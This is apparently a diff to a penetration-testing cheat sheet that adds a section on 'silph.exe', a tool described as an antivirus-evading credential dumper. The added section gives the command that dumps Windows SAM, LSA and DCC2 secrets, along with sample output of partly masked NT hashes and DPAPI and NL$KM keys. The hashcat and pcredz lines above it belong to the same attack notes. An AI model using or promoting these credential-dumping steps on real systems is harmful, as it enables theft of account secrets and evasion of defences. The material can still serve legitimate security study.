@@ -97,3 +97,44 @@ hashcat -m 5600 NTLMv2.txt /usr/share/wordlist/rockyou.txt
 
 ./pcredz -i eth0 -v      # Capture live Interface
 ```
+## 🚈 silph.exe
+- This tool will able to bypass and Dump all secrets like Sam hashes,lsa and dcc2 Hashes.
+- Non Detectable by Defender.
+
+Repo link:- [sliph.exe](unknow)
+### Usage:-
+```bash
+PS C:\Users\Administrator\Desktop> ./silph.exe -dcc2 -lsa -sam
+
+███████╗██╗██╗     ██████╗ ██╗  ██╗
+██╔════╝██║██║     ██╔══██╗██║  ██║
+███████╗██║██║     ██████╔╝███████║
+╚════██║██║██║     ██╔═══╝ ██╔══██║
+███████║██║███████╗██║     ██║  ██║
+╚══════╝╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝
+    Stealthy In-Memory Password Harvester
+
+  "Well… I think I wanted to be like Eris."
+[*] Dumping local SAM hashes
+Name: Administrator
+RID: 500
+NT: 2dfe3378335xxxxxx764e581b856a662a
+Name: DefaultAccount
+RID: 503
+NT: <empty>
+Name: WDAGUtilityAccount
+RID: 504
+NT: 58f8e0214xxxxxxbc2c5f82fb7cb47ca1
+Name: tyler
+RID: 1008
+NT: 1fceba8xxxxxxxxx15fb40e29c86b01f6
+Name: sshd
+RID: 1009
+NT: f450335b6xxxxxxxxx1d44aa53bafb591
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM
+dpapi_machinekey: 0x0e88ce11d311dxxxxx22ac2708a4d707e00be
+dpapi_userkey: 0x8b68be9ef724xxxxxxxxx3559e10078e36e8ab32
+[*] NL$KM
+NL$KM: 0x8dd28e6754cxxxxxxx953b95b46a2b366
+```
